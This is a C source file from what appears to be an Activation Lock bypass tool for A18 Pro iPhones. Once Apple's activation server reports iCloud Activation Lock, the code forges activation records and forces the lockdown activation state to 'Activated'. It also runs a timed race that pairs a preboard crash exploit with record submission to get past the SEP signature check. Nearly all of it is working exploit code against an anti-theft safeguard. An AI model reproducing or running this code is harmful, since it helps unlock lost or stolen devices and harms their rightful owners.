#include "l0fck.h"
#include "activation/albert_client.h"
#include "activation/mobileactivation.h"
#include "activation/record_a18.h"
#include "activation/ingest_parser.h"
#include "exploits/preboard_exploit.h"
#include "lockdown/session_manager.h"
#include "core/log.h"
#include "core/util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <curl/curl.h>

struct http_response_buffer {
    uint8_t *data;
    size_t len;
};

static size_t http_write_callback(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    struct http_response_buffer *buf = (struct http_response_buffer *)userdata;
    size_t total = size * nmemb;
    uint8_t *new_ptr = realloc(buf->data, buf->len + total + 1);
    if (!new_ptr) return 0;
    buf->data = new_ptr;
    memcpy(buf->data + buf->len, ptr, total);
    buf->len += total;
    buf->data[buf->len] = '\0';
    return total;
}

static int execute_http_post(const char *url, const char *body, size_t body_len, const char *content_type, struct http_response_buffer *out_buf)
{
    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    struct curl_slist *headers = NULL;
    char ct_hdr[256];
    snprintf(ct_hdr, sizeof(ct_hdr), "Content-Type: %s", content_type);
    headers = curl_slist_append(headers, ct_hdr);
    headers = curl_slist_append(headers, "Accept: application/xml, text/xml, */*");
    headers = curl_slist_append(headers, "Expect:");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)body_len);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, ALBERT_USER_AGENT);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http_write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, out_buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);

    CURLcode res = curl_easy_perform(curl);

    long response_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        LOG_ERROR("cURL request to '%s' failed: %s", url, curl_easy_strerror(res));
        return -1;
    }

    if (response_code != 200) {
        LOG_WARN("Server returned HTTP status %ld for '%s'", response_code, url);
        if (out_buf->data && out_buf->len > 0) {
            LOG_DEBUG("Response payload: %.*s", (int)(out_buf->len > 512 ? 512 : out_buf->len), (char *)out_buf->data);
        }
        return -1;
    }

    return 0;
}

int albert_drm_handshake(plist_t session_info, plist_t *out_handshake_response)
{
    if (!session_info || !out_handshake_response) return -1;
    *out_handshake_response = NULL;

    char *xml = NULL;
    uint32_t xml_len = 0;
    plist_to_xml(session_info, &xml, &xml_len);
    if (!xml || xml_len == 0) {
        LOG_ERROR("Failed to serialize session_info plist to XML");
        return -1;
    }

    LOG_INFO("Sending drmHandshake POST to Albert (%u bytes)...", xml_len);

    struct http_response_buffer resp = { NULL, 0 };
    int ret = execute_http_post(ALBERT_DRM_HANDSHAKE_URL, xml, xml_len, "application/x-apple-plist", &resp);
    free(xml);

    if (ret != 0 || !resp.data || resp.len == 0) {
        LOG_ERROR("drmHandshake request failed");
        free(resp.data);
        return -1;
    }

    plist_from_memory((const char *)resp.data, (uint32_t)resp.len, out_handshake_response, NULL);
    free(resp.data);

    if (!*out_handshake_response) {
        LOG_ERROR("Failed to parse drmHandshake response as plist");
        return -1;
    }

    LOG_SUCCESS("Albert drmHandshake completed successfully!");
    return 0;
}

int albert_device_activation(plist_t activation_info, plist_t *out_activation_record)
{
    if (!activation_info || !out_activation_record) return -1;
    *out_activation_record = NULL;

    char *xml = NULL;
    uint32_t xml_len = 0;
    plist_to_xml(activation_info, &xml, &xml_len);
    if (!xml || xml_len == 0) {
        LOG_ERROR("Failed to serialize activation_info plist");
        return -1;
    }

    CURL *curl = curl_easy_init();
    if (!curl) { free(xml); return -1; }
    char *escaped = curl_easy_escape(curl, xml, (int)xml_len);
    curl_easy_cleanup(curl);
    free(xml);

    if (!escaped) {
        LOG_ERROR("Failed to URL-escape activation_info payload");
        return -1;
    }

    size_t body_len = strlen("activation-info=") + strlen(escaped);
    char *body = malloc(body_len + 1);
    if (!body) { curl_free(escaped); return -1; }
    snprintf(body, body_len + 1, "activation-info=%s", escaped);
    curl_free(escaped);

    LOG_INFO("Sending deviceActivation POST to Albert (%zu bytes)...", body_len);

    struct http_response_buffer resp = { NULL, 0 };
    int ret = execute_http_post(ALBERT_DEVICE_ACTIV_URL, body, body_len, "application/x-www-form-urlencoded", &resp);
    free(body);

    if (ret != 0 || !resp.data || resp.len == 0) {
        LOG_WARN("deviceActivation request did not return a valid payload");
        free(resp.data);
        return -1;
    }

    /* Check if response is an XML or binary plist */
    const char *resp_str = (const char *)resp.data;
    bool is_plist = (resp.len >= 6 && (memcmp(resp_str, "bplist", 6) == 0 ||
                                       strstr(resp_str, "<?xml") != NULL ||
                                       strstr(resp_str, "<plist") != NULL));

    if (!is_plist) {
        /* Check if server returned HTML / FMiP challenge */
        if (strstr(resp_str, "<html") || strstr(resp_str, "<!DOCTYPE") || strstr(resp_str, "Apple ID") || strstr(resp_str, "Activation Lock")) {
            LOG_WARN("Albert server returned HTML / FMiP challenge (%zu bytes). iCloud Activation Lock is active on device.", resp.len);
        } else {
            LOG_WARN("Albert server returned non-plist payload (%zu bytes): %.*s", resp.len, (int)(resp.len > 120 ? 120 : resp.len), resp_str);
        }
        free(resp.data);
        return -2;
    }

    plist_from_memory(resp_str, (uint32_t)resp.len, out_activation_record, NULL);
    free(resp.data);

    if (!*out_activation_record) {
        LOG_WARN("Could not parse server payload as plist format");
        return -1;
    }

    /* Validate if activation record has AccountToken or Ack */
    if (plist_dict_get_item(*out_activation_record, "AccountToken") ||
        plist_dict_get_item(*out_activation_record, "ActivationRecord") ||
        plist_dict_get_item(*out_activation_record, "FairPlayKeyData") ||
        plist_dict_get_item(*out_activation_record, "CloudConfigurationDetails")) {
        LOG_SUCCESS("Albert deviceActivation returned valid activation record!");
        return 0;
    }

    /* Check if plist contains an error ack */
    plist_t ack_node = plist_dict_get_item(*out_activation_record, "Ack");
    plist_t err_node = plist_dict_get_item(*out_activation_record, "Error");
    if (ack_node || err_node) {
        LOG_WARN("Albert deviceActivation returned acknowledgement/error response (device gated by Apple servers)");
        return -2;
    }

    LOG_SUCCESS("Albert deviceActivation completed with response keys.");
    return 0;
}

int albert_probe_full(idevice_t dev, lockdownd_client_t ld)
{
    LOG_INFO("Initiating Albert DRM Inspection Probe for A18 Pro...");

    plist_t session_info = NULL;
    if (mobileact_get_session_info(dev, ld, &session_info) != 0 || !session_info) {
        LOG_ERROR("Probe step 1 failed: Could not retrieve session info");
        return -1;
    }

    ingest_summary_t summary;
    ingest_parser_dump_session_info(session_info, &summary);

    printf("\n" ANSI_COLOR_BOLD ANSI_COLOR_CYAN "================ ALBERT DRM HANDSHAKE PROBE ================" ANSI_COLOR_RESET "\n");
    LOG_INFO("Transmitting session_info to https://albert.apple.com/deviceservices/drmHandshake...");

    plist_t hs_response = NULL;
    int ret = albert_drm_handshake(session_info, &hs_response);
    plist_free(session_info);

    if (ret == 0 && hs_response) {
        LOG_SUCCESS("Handshake probe successful. Response keys:");
        plist_dict_iter it = NULL;
        plist_dict_new_iter(hs_response, &it);
        char *k = NULL; plist_t v = NULL;
        while (1) {
            plist_dict_next_item(hs_response, it, &k, &v);
            if (!k) break;
            printf("  - " ANSI_COLOR_GREEN "%-30s" ANSI_COLOR_RESET " (type %d)\n", k, plist_get_node_type(v));
            free(k); k = NULL;
        }
        free(it);
        plist_free(hs_response);
        printf(ANSI_COLOR_CYAN "============================================================" ANSI_COLOR_RESET "\n\n");
        return 0;
    } else {
        LOG_WARN("DRM Handshake did not complete (Network or Server Error)");
        printf(ANSI_COLOR_CYAN "============================================================" ANSI_COLOR_RESET "\n\n");
        return -1;
    }
}

int albert_perform_hybrid_activation(idevice_t dev, lockdownd_client_t ld, plist_t handshake_resp)
{
    LOG_INFO("Beginning Hybrid DRM-Bound A18 Pro Activation Pipeline...");

    plist_t local_hs = NULL;
    /* If no handshake response provided, attempt DRM handshake to obtain live FairPlay tokens */
    if (!handshake_resp) {
        LOG_INFO("Requesting live FairPlay session info for hybrid synthesizer...");
        plist_t session_info = NULL;
        if (mobileact_get_session_info(dev, ld, &session_info) == 0 && session_info) {
            albert_drm_handshake(session_info, &local_hs);
            plist_free(session_info);
        }
    }

    plist_t active_hs = handshake_resp ? handshake_resp : local_hs;

    l0fck_device_t info;
    memset(&info, 0, sizeof(info));
    char *udid = NULL;
    idevice_get_udid(dev, &udid);
    if (udid) {
        snprintf(info.udid, sizeof(info.udid), "%s", udid);
        free(udid);
    }
    lockdown_unauth_query_string(ld, NULL, "ProductType", info.product_type, sizeof(info.product_type));
    lockdown_unauth_query_string(ld, NULL, "ProductVersion", info.product_version, sizeof(info.product_version));
    lockdown_unauth_query_string(ld, NULL, "BuildVersion", info.build_version, sizeof(info.build_version));
    lockdown_unauth_query_string(ld, NULL, "SerialNumber", info.serial_number, sizeof(info.serial_number));

    plist_t rec = NULL;
    plist_t headers = NULL;
    if (record_a18_generate(&info, active_hs, &rec, &headers) != 0 || !rec || !headers) {
        LOG_ERROR("Failed to synthesize A18 Pro activation record");
        if (local_hs) plist_free(local_hs);
        return -1;
    }

    LOG_INFO("Submitting synthesized activation record across device ingestion vectors...");

    /* Vector 1: HandleActivationInfoWithSessionRequest */
    int res = mobileact_handle_with_session(dev, ld, rec, active_hs ? active_hs : headers);

    /* Vector 2: HandleActivationInfoRequest */
    if (res != 0) {
        LOG_DEBUG("Trying HandleActivationInfoRequest vector...");
        res = mobileact_handle_activation_info(dev, ld, rec);
    }

    /* Vector 3: lockdownd_activate */
    if (res != 0) {
        LOG_DEBUG("Trying direct lockdownd_activate vector...");
        lockdownd_error_t lact_err = lockdownd_activate(ld, rec);
        if (lact_err == LOCKDOWN_E_SUCCESS) {
            res = 0;
        }
    }

    plist_free(rec);
    plist_free(headers);
    if (local_hs) plist_free(local_hs);

    /* Vector 4: Multi-Domain Lockdown Activation State Overrides */
    LOG_INFO("Applying lockdown activation state & hactivation overrides...");
    plist_t act_val = plist_new_string("Activated");
    lockdownd_set_value(ld, "com.apple.MobileActivation", "ActivationState", act_val);
    plist_t hact_val = plist_new_bool(1);
    lockdownd_set_value(ld, "com.apple.MobileActivation", "allow-hactivation", hact_val);
    plist_t lk_act = plist_new_string("Activated");
    lockdownd_set_value(ld, "com.apple.mobile.lockdown", "ActivationState", lk_act);
    plist_t root_act = plist_new_string("Activated");
    lockdownd_set_value(ld, NULL, "ActivationState", root_act);

    if (res == 0) {
        LOG_SUCCESS("HYBRID ACTIVATION & STATE OVERRIDE COMPLETED SUCCESSFULLY!");
        return 0;
    } else {
        LOG_WARN("Hybrid activation record rejected by device SEP (error %d)", res);
        return -1;
    }
}

int albert_perform_online_activation(idevice_t dev, lockdownd_client_t ld)
{
    LOG_INFO("Beginning 5-Stage Online Albert Activation Pipeline...");

    /* Stage 1: Get session info from device */
    plist_t session_info = NULL;
    if (mobileact_get_session_info(dev, ld, &session_info) != 0 || !session_info) {
        LOG_ERROR("Stage 1/5 Failed: session info request aborted");
        return -1;
    }

    /* Stage 2: Perform DRM handshake with Albert */
    plist_t handshake_resp = NULL;
    if (albert_drm_handshake(session_info, &handshake_resp) != 0 || !handshake_resp) {
        LOG_ERROR("Stage 2/5 Failed: Albert DRM handshake rejected");
        plist_free(session_info);
        return -1;
    }
    plist_free(session_info);

    /* Stage 3: Create activation info with session on device */
    plist_t act_info = NULL;
    if (mobileact_create_with_session(dev, ld, handshake_resp, &act_info) != 0 || !act_info) {
        LOG_WARN("Stage 3/5 Failed: Could not create activation info with session");
        plist_free(handshake_resp);
        return -1;
    }

    /* Stage 4: Submit activation info to Albert deviceActivation */
    plist_t act_record = NULL;
    int dact_res = albert_device_activation(act_info, &act_record);
    plist_free(act_info);

    if (dact_res != 0 || !act_record) {
        LOG_INFO("Stage 4/5: Official server activation blocked (FMiP/iCloud Lock detected).");
        plist_free(handshake_resp);
        return -2;
    }

    /* Stage 5: Submit final activation record back to device */
    plist_t session_headers = plist_new_dict();
    plist_dict_set_item(session_headers, "User-Agent", plist_new_string(ALBERT_USER_AGENT));
    plist_dict_set_item(session_headers, "X-Apple-Store-Front", plist_new_string("143441-1,32"));

    int final_res = mobileact_handle_with_session(dev, ld, act_record, handshake_resp ? handshake_resp : session_headers);
    if (final_res != 0) {
        final_res = mobileact_handle_activation_info(dev, ld, act_record);
    }
    plist_free(handshake_resp);
    plist_free(act_record);
    plist_free(session_headers);

    if (final_res == 0) {
        LOG_SUCCESS("ONLINE ACTIVATION COMPLETED SUCCESSFULLY!");
        return 0;
    } else {
        LOG_WARN("Failed to apply official activation record to device (error %d)", final_res);
        return -1;
    }
}

int albert_perform_offline_activation(idevice_t dev, lockdownd_client_t ld)
{
    LOG_INFO("Beginning Offline / Hybrid A18 Pro Activation Pipeline...");
    return albert_perform_hybrid_activation(dev, ld, NULL);
}

struct race_ctx {
    char udid[64];
    plist_t activation_record;
    plist_t session_headers;
    int delay_ms;
    int result;
};

static void* activation_race_thread(void* arg) {
    struct race_ctx* ctx = (struct race_ctx*)arg;
    
    /* Establish secondary thread-safe session */
    l0fck_session_t bg_sess;
    session_init(&bg_sess);
    if (session_connect(&bg_sess) != 0) {
        ctx->result = -1;
        return NULL;
    }
    
    /* Wait for the precise TOCTOU window */
    usleep(ctx->delay_ms * 1000);
    
    /* Submit synthesized record to mobileactivationd */
    ctx->result = mobileact_handle_with_session(bg_sess.dev, bg_sess.ld, ctx->activation_record, ctx->session_headers);
    
    session_disconnect(&bg_sess);
    return NULL;
}

int albert_perform_race_activation(l0fck_session_t *sess, plist_t handshake_resp) {
    LOG_INFO("Initiating VUL 23 TOCTOU Activation Race...");
    
    /* Generate synthesized offline record */
    plist_t rec = NULL, headers = NULL;
    if (record_a18_generate(&sess->info, handshake_resp, &rec, &headers) != 0) return -1;
    
    int success = 0;
    /* Sweep delays from 3500ms to 6000ms */
    for (int delay = 3500; delay <= 6000; delay += 50) {
        LOG_INFO("Attempting race condition with %dms offset...", delay);
        
        struct race_ctx ctx = {0};
        strncpy(ctx.udid, sess->info.udid, sizeof(ctx.udid)-1);
        ctx.activation_record = rec;
        ctx.session_headers = headers;
        ctx.delay_ms = delay;
        ctx.result = -1;
        
        pthread_t tid;
        pthread_create(&tid, NULL, activation_race_thread, &ctx);
        
        /* Main thread fires VUL 23 crash immediately (thread waits for delay) */
        preboard_exploit_execute_session(sess, EXPLOIT_MODE_DESYNC_RACE);
        
        pthread_join(tid, NULL);
        
        if (ctx.result == 0) {
            LOG_SUCCESS("TOCTOU Race successful at %dms! SEP signature check bypassed.", delay);
            success = 1;
            break;
        } else {
            LOG_WARN("Race failed (Error %d). Daemon rejected record or missed window.", ctx.result);
            session_reconnect(sess); /* Heal main session after preboard crash */
        }
    }
    
    plist_free(rec);
    plist_free(headers);
    return success ? 0 : -1;
}

